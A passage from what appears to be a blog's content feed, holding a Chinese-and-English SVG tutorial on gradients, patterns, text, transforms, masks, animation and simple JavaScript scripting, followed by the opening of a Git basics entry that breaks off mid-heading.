xmlns=&quot;https://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">  &lt;defs&gt;</span><br><span class="line">      &lt;linearGradient id=&quot;Gradient1&quot; x1=&quot;0&quot; x2=&quot;0&quot; y1=&quot;0&quot; y2=&quot;1&quot;&gt;</span><br><span class="line">         &lt;stop offset=&quot;0%&quot; stop-color=&quot;red&quot; /&gt;</span><br><span class="line">         &lt;stop offset=&quot;50%&quot; stop-color=&quot;black&quot; stop-opacity=&quot;0.1&quot; /&gt;</span><br><span class="line">         &lt;stop offset=&quot;100%&quot; stop-color=&quot;blue&quot; /&gt;</span><br><span class="line">      &lt;/linearGradient&gt;</span><br><span class="line">  &lt;/defs&gt;</span><br><span class="line">  &lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;100&quot; fill=&quot;url(#Gradient1)&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>径向渐变<br>从一个点开始发散绘制渐变。<br><em>spreadMethod</em> : 当渐变到达终点，但此时尚未被填充完。可以设置spreadMethod, <strong>pad</strong>最终的偏移颜色被用于填充对象剩下的空间。 <strong>reflect</strong>让渐变一直持续下去，但效果与渐变本身相反。 <strong>repeat</strong>跳回最初的颜色然后继续渐变。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;radialGradient id=&quot;RadialGradient1&quot; cx=&quot;0.5&quot; cy=&quot;0.5&quot; r=&quot;0.25&quot; fx=&quot;0.25&quot; fy=&quot;0.25&quot; spreadMethod=&quot;repeat&quot;&gt;</span><br><span class="line">      &lt;stop offset=&quot;0%&quot; stop-color=&quot;red&quot; /&gt;</span><br><span class="line">      &lt;stop offset=&quot;100%&quot; stop-color=&quot;blue&quot; /&gt;</span><br><span class="line">   &lt;/radialGradient&gt;</span><br><span class="line">&lt;/defs&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>图案<br><em><code>&lt;pattern&gt;</code></em> 需要放在SVG文档的defs内部。pattern定义了一个单元系统，在pattern元素内你可以包含任何基本形状。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">  &lt;pattern id=&quot;Pattern&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;0.25&quot; height=&quot;0.25&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;50&quot; height=&quot;50&quot; fill=&quot;blue&quot;/&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;25&quot; height=&quot;25&quot; fill=&quot;url(#Gradient1)&quot;&gt;</span><br><span class="line">  &lt;/pattern&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;rect fill=&quot;url(#Pattern)&quot; stroke=&quot;black&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-文本"><a href="#6-文本" class="headerlink" title="6. 文本"></a>6. 文本</h3><p><em><code>&lt;text&gt;属性</code></em><br>(x,y)位置, text-anchor(文本流的方向):start/middle/end/inherit, fill, stroke, font-family, font-style, font-weight, font-variant, font-stretch, font-size, font-size-adjust, kerning, letter-spacing, word-spacing, text-decoration。</p><p><em><code>&lt;tspan&gt;属性</code></em><br>(x,y), (dx,dy), rotate(所有字符旋转一个角度), textLength, </p><p><em><code>&lt;tref&gt;元素</code></em><br>允许引用已经定义的文本，使用<code>xlink:href</code>属性，把它指向一个元素，取得其文本内容。</p><p><em><code>&lt;textPath&gt;元素</code></em><br>利用<code>xlink:href</code>属性取得一个任意路径，字体会环绕路径走。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;text id=&quot;example&quot;&gt;This is an example&lt;/text&gt;</span><br><span class="line">&lt;path id=&quot;my_path&quot; d=&quot;M 20,20 C 40,40 80,40 100,20&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;text x=&quot;10&quot; y=&quot;10&quot;&gt;</span><br><span class="line">   &lt;tspan font-weight=&quot;bold&quot; fill=&quot;red&quot;&gt;Hello&lt;/tspan&gt;</span><br><span class="line">   &lt;tref xlink:href=&quot;#example&quot;/&gt;</span><br><span class="line">   &lt;textPath xlink:href=&quot;#my_path&quot;&gt;Hello&lt;/textPath&gt;</span><br><span class="line">&lt;/text&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-变形-剪切-遮罩"><a href="#7-变形-剪切-遮罩" class="headerlink" title="7. 变形,剪切,遮罩"></a>7. 变形,剪切,遮罩</h3><ul><li><p>变形 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;10&quot; height=&quot;10&quot; transform=&quot;translate(30,40)&quot;&gt;</span><br><span class="line">translate(30,40)     // 平移: 把矩形移动到点(30,40)</span><br><span class="line">rotate(45)           // 旋转: 指定旋转角度数</span><br><span class="line">skewX(40)、skewY(40) // 斜切: 制作一个斜菱形 </span><br><span class="line">scale(0.5)           // 缩放</span><br></pre></td></tr></table></figure></li><li><p>剪切<br><code>&lt;clipPath&gt;</code>擦除已经创建的元素的部分内容，如绘制半圆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;clipPath id=&quot;cut-off-bottom&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;200&quot; height=&quot;100&quot; /&gt;</span><br><span class="line">   &lt;/clipPath&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;circle cx=&quot;100&quot; cy=&quot;100&quot; r=&quot;100&quot; clip-path=&quot;url(#cut-off-bottom)&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>遮罩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;mask id=&quot;Mask&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; fill=&quot;url(#Gradient1)&quot;&gt;</span><br><span class="line">   &lt;/mask&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; mask=&quot;url(#Mask)&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>嵌入图像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;image x=&quot;0&quot; y=&quot;0&quot; width=&quot;10&quot; height=&quot;10&quot; transform=&quot;rotate(45)&quot; xlink:href=&quot;1.png&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>可嵌入任意XML<br><br></p></li></ul><h3 id="8-动画"><a href="#8-动画" class="headerlink" title="8. 动画"></a>8. 动画</h3><svg xmlns="http://www.w3.org/2000/svg">    <rect x="10" y="10" height="110" width="110" style="fill: #0000ff"/>        <animatetransform attributename="transform" begin="0s" dur="20s" type="rotate" from="0 60 60" to="360 60 60" repeatcount="indefinite">    </animatetransform></svg><p><br></p><h3 id="9-SVG-Animation"><a href="#9-SVG-Animation" class="headerlink" title="9. SVG Animation"></a>9. SVG Animation</h3><p>Animation is done by manipulating the attributes of shapes over time. This is done using one or more of the 5 SVG animation elements:<code>&lt;set&gt; &lt;animate&gt; &lt;animateColor&gt; &lt;animateTransform&gt; &lt;animateMotion&gt;</code></p><ul><li><p><em><code>&lt;set&gt;</code></em><br>The shape is not continuously animating, but just changes attribute attribute value once after a specific time. The example above sets the attribute <code>r</code> to 100 after 5 seconds.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot; version=&quot;1.1&quot;&gt;</span><br><span class="line">  &lt;circle cx=&quot;30&quot; cy=&quot;30&quot; r=&quot;25&quot; style=&quot;fill: #0000ff;&quot;&gt;</span><br><span class="line">    &lt;set attributeName=&quot;r&quot; attributeType=&quot;XML&quot; to=&quot;100&quot; begin=&quot;5s&quot;/&gt;</span><br><span class="line">  &lt;/circle&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p><em><code>&lt;animate&gt;</code></em><br>The <code>animate</code> element is used to animate an attribute of an SVG shape. You nest the <code>animate</code> element inside the shape you want it applied to.<br>This example animate the <code>cx</code> attribute of the <code>&lt;circle&gt;</code> element from a value of 30 to the value of 470. The animation starts at 0 seconds, and has a duration of 5 seconds. The animation repeats indefinitely.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;circle cx=&quot;30&quot; cy=&quot;30&quot; r=&quot;25&quot; style=&quot;stroke: none; fill: #0000ff;&quot;&gt;</span><br><span class="line">  &lt;animate attributeName=&quot;cx&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;30&quot;  to=&quot;470&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;5s&quot;</span><br><span class="line">    fill=&quot;remove&quot; repeatCount=&quot;indefinite&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/circle&gt;</span><br></pre></td></tr></table></figure></li><li><p><em><code>&lt;animateTransform&gt;</code></em><br>The <code>&lt;animateTransform&gt;</code> element can animate the <code>transform</code> attribute of a shape.<br>The example animates the <code>transform</code> attribute of the <code>&lt;rect&gt;</code> element it is nested inside. The <code>type</code> attribute is set to <code>rotate</code> meaning the animated transformation will be a rotation. The <code>from</code> and <code>to</code> attributes set the parameters to be animated and passed to <code>rotate</code> function. This example rotates from a degree of 0 to a degree of 360 around point 5,5.<br><br></p></li></ul><svg width="50" height="50">  <rect x="10" y="10" width="10" height="10" style="stroke: #ff00ff; fill:none;"/>    <animatetransform attributename="transform" type="rotate" from="0 5 5" to="360 5 5" begin="0s" dur="10s" repeatcount="indefinite">  </animatetransform></svg><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;10&quot; height=&quot;10&quot;</span><br><span class="line">    style=&quot;stroke: #ff00ff; fill:none;&quot; &gt;</span><br><span class="line">  &lt;animateTransform attributeName=&quot;transform&quot;</span><br><span class="line">    type=&quot;rotate&quot;</span><br><span class="line">    from=&quot;0 5 5&quot; to=&quot;360 5 5&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">    repeatCount=&quot;indefinite&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br><span class="line"></span><br><span class="line">&lt;rect x=&quot;20&quot; y=&quot;20&quot; width=&quot;40&quot; height=&quot;40&quot; style=&quot;stroke: #ff00ff; fill: none;&quot; &gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot;</span><br><span class="line">      type=&quot;scale&quot;</span><br><span class="line">      from=&quot;1 1&quot; to=&quot;2 3&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">    /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure><p><br></p><ul><li><em><code>&lt;animateMotion&gt;</code></em><br>The <code>&lt;animateMotion&gt;</code> element can animate the movement of a shape along a path.<br>In order to rotate the square to align with the slope of the path, you can set the <code>rotate</code> attribute of the <code>&lt;animateMotion&gt;</code> element to <code>auto</code>. You can also set the <code>rotate</code> attribute to a specific value, like 20 or 30 etc. That will keep the shape rotated that number of degrees throughout the animation.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">    &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;30&quot; height=&quot;15&quot; style=&quot;stroke: #ff0000; fill: none;&quot;&gt;</span><br><span class="line">        &lt;animateMotion path=&quot;M10,50 q60,50 100,0 q60,-50 100,0&quot; begin=&quot;0s&quot; dur=&quot;10s&quot; repeatCount=&quot;indefinite&quot; rotate=&quot;auto&quot;/&gt;</span><br><span class="line">    &lt;/rect&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/SVG文档/1.jpeg" style="max-width: 380px"><br><br></p><ul><li><em>Time Units</em><br>h, min, s, ms, hh:mm:ss<br><br></li></ul><ul><li><em>Coordinating Animations</em><br>The <code>begin</code> attribute value is set to <code>one.end</code> which means that this animation should start when the animation with the id <code>one</code> ends. You can also specify offsets to start or end time of another animation, like <code>one.begin+10s</code>.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;30&quot; height=&quot;15&quot; style=&quot;stroke: #ff0000; fill: none;&quot;&gt;</span><br><span class="line">  &lt;animate id=&quot;one&quot; attributeName=&quot;x&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;0&quot; to=&quot;400&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">  &lt;animate attributeName=&quot;y&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;0&quot; to=&quot;50&quot;</span><br><span class="line">    begin=&quot;one.end&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">    /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>Repeating Animations</em><br>There are two attributes you can use inside an animation element which are used to repeat the animation.<br>The first attribute is the <code>repeatCount</code> attribute. You can set a number of times, or the value <code>indefinite</code> which will keep the animation running without ever stopping.<br>The second attribute is the <code>repeatDur</code> which specifies a duration for which the animation is to be repeated.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;animate attributeName=&quot;y&quot; attributeType=&quot;XML&quot;</span><br><span class="line">  from=&quot;0&quot; to=&quot;50&quot;</span><br><span class="line">  begin=&quot;one.end&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">  repeatCount=&quot;3&quot;</span><br><span class="line">  // repeatCount=&quot;indefinite&quot;</span><br><span class="line">  // repeatDur=&quot;30s&quot;</span><br><span class="line">  /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>Combining Animations</em><br>You can combine animations by listing more than one <code>&lt;animation&gt;</code> inside the element to animate.<br>When combining <code>&lt;animateTransform&gt;</code> elements, the default behaviour is for the second animation to cancel out the first. Howeve, you can combine the transformation animations by add the attribute <code>additive</code> with a value of <code>sum</code> to both <code>&lt;animateTransform&gt;</code> elemens.<br>Here is an example which both scales and rotates a rectangle.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;40&quot; height=&quot;20&quot; style=&quot;stroke: #000000; fill: none;&quot;&gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot; attributeType=&quot;XML&quot;</span><br><span class="line">      type=&quot;scale&quot;</span><br><span class="line">      from=&quot;1&quot; to=&quot;3&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">      additive=&quot;sum&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot; attributeType=&quot;XML&quot;</span><br><span class="line">      type=&quot;rotate&quot;</span><br><span class="line">      from=&quot;0 30 20&quot; to=&quot;360 30 20&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      fill=&quot;freeze&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">      additive=&quot;sum&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="10-SVG-Scripting"><a href="#10-SVG-Scripting" class="headerlink" title="10. SVG Scripting"></a>10. SVG Scripting</h3><p>Via scripting you can modify the SVG elements, animate them, or listen for mouse events on the shapes.</p><h4 id="10-1-Changing-attribute-values"><a href="#10-1-Changing-attribute-values" class="headerlink" title="10.1 Changing attribute values"></a>10.1 Changing attribute values</h4><p>Here is a simple SVG scripting example which changes the dimensions of an SVG rectangle when a button is clicked.</p><svg width="500" height="100">    <rect id="rect1" x="10" y="10" width="50" height="80" style="stroke:#000000; fill:none;"/></svg><input id="button1" type="button" value="Change Dimensions" onclick="changeDimensions()"><script>  function changeDimensions() {    document.getElementById("rect1").setAttribute("width", "100");  }</script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot;&gt;</span><br><span class="line">    &lt;rect id=&quot;rect1&quot; x=&quot;10&quot; y=&quot;10&quot; width=&quot;50&quot; height=&quot;80&quot; style=&quot;stroke:#000000; fill:none;&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">&lt;input id=&quot;button1&quot; type=&quot;button&quot; value=&quot;Change Dimensions&quot; onclick=&quot;changeDimensions()&quot;/&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function changeDimensions() &#123;</span><br><span class="line">    var svgElement = document.getElementById(&quot;rect1&quot;);</span><br><span class="line">    var width = svgElement.getAttribute(&quot;width&quot;);</span><br><span class="line">    svgElement.setAttribute(&quot;width&quot;, &quot;100&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="10-2-Event-Listeners"><a href="#10-2-Event-Listeners" class="headerlink" title="10.2 Event Listeners"></a>10.2 Event Listeners</h4><p>You can add event listeners to an SVG shape directly in the SVG if you want. You do so just like you would with an HTML element. You can also attach an event listener to an SVG element using the <code>addEventListener()</code> function.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;75&quot; style=&quot;stroke: #000000; fill: #eeeeee;&quot;</span><br><span class="line">  onmouseover=&quot;this.style.stroke = &apos;#ff0000&apos;; this.style[&apos;stroke-width&apos;] = 5;&quot;</span><br><span class="line">  onmouseout=&quot;this.style.stroke = &apos;#000000&apos;; this.style[&apos;stroke-width&apos;] = 1;&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure></p><svg width="500" height="100">  <rect x="10" y="10" width="100" height="75" style="stroke: #000000; fill: #eeeeee;" onmouseover="this.style.stroke = '#ff0000'; this.style['stroke-width'] = 5;" onmouseout="this.style.stroke = '#000000'; this.style['stroke-width'] = 1;"/> </svg><p><br></p><h4 id="10-3-Animating-SVG-Shapes"><a href="#10-3-Animating-SVG-Shapes" class="headerlink" title="10.3 Animating SVG Shapes"></a>10.3 Animating SVG Shapes</h4><p>In order to animate an SVG shape you need to call a Javascript function repeatedly. The function changes the position or dimensions of a shape.<br><svg width="500" height="100">    <circle id="circle1" cx="20" cy="20" r="10" style="stroke: none; fill: #ff0000;"/></svg><script>    var timerFunction = null;    function startAnimation() {        if(timerFunction == null) {            timerFunction = setInterval(animate, 20);        }    }    function stopAnimation() {        if(timerFunction != null){            clearInterval(timerFunction);            timerFunction = null;        }    }    function animate() {        var circle = document.getElementById("circle1");        var x = circle.getAttribute("cx");        var newX = 2 + parseInt(x);        if(newX > 500) {            newX = 20;        }        circle.setAttribute("cx", newX);    }</script><br><input type="button" value="Start Animation" onclick="startAnimation();"><input type="button" value="Stop Animation" onclick="stopAnimation();"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"500"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"circle1"</span> <span class="attr">cx</span>=<span class="string">"20"</span> <span class="attr">cy</span>=<span class="string">"20"</span> <span class="attr">r</span>=<span class="string">"10"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">"stroke: none; fill: #ff0000;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> timerFunction = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">startAnimation</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(timerFunction == <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="undefined">            timerFunction = setInterval(animate, 20);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">stopAnimation</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(timerFunction != <span class="literal">null</span>)&#123;</span></span><br><span class="line"><span class="undefined">            clearInterval(timerFunction);</span></span><br><span class="line"><span class="javascript">            timerFunction = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">animate</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> circle = <span class="built_in">document</span>.getElementById(<span class="string">"circle1"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x = circle.getAttribute(<span class="string">"cx"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> newX = <span class="number">2</span> + <span class="built_in">parseInt</span>(x);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(newX &gt; <span class="number">500</span>) &#123;</span></span><br><span class="line"><span class="undefined">            newX = 20;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        circle.setAttribute(<span class="string">"cx"</span>, newX);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Start Animation"</span> <span class="attr">onclick</span>=<span class="string">"startAnimation();"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Stop Animation"</span> <span class="attr">onclick</span>=<span class="string">"stopAnimation();"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Tutorial" target="_blank" rel="noopener">MDN - SVG教程</a></li><li><a href="http://tutorials.jenkov.com/svg/svg-animation.html" target="_blank" rel="noopener">SVG Tutorial</a></li><li><a href="https://zhuanlan.zhihu.com/p/36031294" target="_blank" rel="noopener">SVG 浪啊，浪来了，大浪来了</a></li><li><a href="https://ant.design/components/icon-cn/" target="_blank" rel="noopener">Ant Design Icons</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Git命令</title>
      <link href="/2018/09/13/Git%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/09/13/Git%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h3 id="1-Git简介"><a href="#1-Git简介" class="headerlink" title="1. Git简介"></a>1. Git简介</h3><ul><li>【直接记录快照，而非比较差异】git与其他版本控制系统的主要差别在于Git对待数据的方法。大部分系统以文件变更列表的方式存储信息。反之,Git对待数据更像是一个 <strong>快照流</strong>。每次你提交更新，它会对当时的全部文件制作一个快照并保存这个快照的索引。为了高效，如果文件没有修改，git不再重新存储改文件，而是只保留了一个链接指向之前存储的文件。</li><li>【近乎所有操作都是本地执行】git的大部分操作都只需访问本地文件和资源，因为你在本地磁盘上就有项目的完整历史。</li><li>【git保证完整性】所有数据再存储前都计算校验和，这意味着不可能在git不知情时更改任何文件内容或目录内容。</li><li>【git一般只添加数据】你的git操作，几乎只往git数据库中增加数据。很难让git直行不可逆操作，或者让它以任何方式清除数据。</li></ul><p><br></p><h3 id="2-Git命令"><a href="#2-Git命令" class="headerlink" title="2. Git命令"></a>2. Git命令</h3><h4 id="2-1-获取仓库"><a href="#2-1-获取仓库" class="headerlink" title="2.1 获取仓库"></a>2.1 获取仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 在现有目录中初始化仓库</span><br><span class="line">$ git init</span><br><span class="line">$ git add *.c</span><br><span class="line">$ git add LICENSE</span><br><span class="line">$ git commit -m &apos;initial project version&apos;</span><br><span class="line"></span><br><span class="line">// 克隆现有的仓库</span><br><span class="line">$ git clone https://github.com/libgit2/libgit2</span><br></pre></td></tr></table></figure><h4 id="2-2-记录每次更新到仓库"><a href="#2-2-记录每次更新到仓库" class="headerlink" title="2.2 